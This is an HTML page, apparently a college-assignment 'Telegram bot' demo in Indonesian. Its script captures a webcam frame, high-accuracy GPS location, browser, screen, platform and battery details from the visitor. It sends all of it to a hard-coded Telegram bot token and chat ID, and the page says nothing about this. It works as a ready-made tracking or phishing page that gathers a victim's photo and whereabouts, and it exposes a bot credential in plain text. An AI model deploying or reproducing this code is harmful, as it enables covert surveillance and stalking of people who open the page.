<!DOCTYPE html>
<html>
<head>
  <title>Tugas Kuliah - Bot Telegram</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
  <h1>Tugas Kuliah - Bot Telegram</h1>
  
  <video id="video" autoplay></video>
  <button onclick="startCapture()">Ambil Foto, Lokasi, dan Info Perangkat</button>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const chatId = '1121369247';

    function sendTelegramMessage(text) {
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      const data = { chat_id: chatId, text: text };
      $.post(url, data);
    }

    function sendTelegramPhoto(photo) {
      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
      const data = { chat_id: chatId, photo: photo };
      $.post(url, data);
    }

    function startCapture() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
          video.srcObject = stream;
        })
        .catch(function(error) {
          console.error('Error accessing camera: ', error);
        });

      video.addEventListener('loadedmetadata', function() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
      });

      video.addEventListener('play', function() {
        captureFrame();
      });

      function captureFrame() {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        setTimeout(captureFrame, 16); // Capture frame every 16ms (60 fps)
      }

      setTimeout(function() {
        capturePhotoAndSend();
      }, 3000);
    }

    function capturePhotoAndSend() {
      const canvas = document.getElementById('canvas');
      const photoData = canvas.toDataURL('image/jpeg');
      sendTelegramPhoto(photoData);

      getLiveLocation();
      getDeviceInfo();
      getBatteryInfo();
      copyToClipboard();
    }

    function getLiveLocation() {
      if ('geolocation' in navigator) {
        const options = { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 };
        navigator.geolocation.getCurrentPosition(function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const locationText = `Lokasi: ${lat}, ${lon}`;
          sendTelegramMessage(locationText);
        }, function(error) {
          console.error('Error getting location: ', error);
        }, options);
      } else {
        sendTelegramMessage('Maaf, peramban tidak mendukung geolokasi.');
      }
    }

    function getDeviceInfo() {
      const deviceInfo = `
        Browser: ${navigator.userAgent}
        Resolusi Layar: ${screen.width}x${screen.height}
        Sistem Operasi: ${navigator.platform}
      `;
      sendTelegramMessage(deviceInfo);
    }

    function getBatteryInfo() {
      if ('getBattery' in navigator) {
        navigator.getBattery().then(function(battery) {
          const batteryInfo = `
            Level Baterai: ${battery.level * 100}%
            Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}
          `;
          sendTelegramMessage(batteryInfo);
        });
      } else {
        sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
      }
    }

    function copyToClipboard() {
      const deviceInfo = `
        Browser: ${navigator.userAgent}
        Resolusi Layar: ${screen.width}x${screen.height}
        Sistem Operasi: ${navigator.platform}
      `;
      navigator.clipboard.writeText(deviceInfo)
        .then(function() {
          sendTelegramMessage('Info perangkat telah disalin ke clipboard.');
        })
        .catch(function(error) {
          console.error('Error copying to clipboard: ', error);
        });
    }
  </script>
</body>
</html>
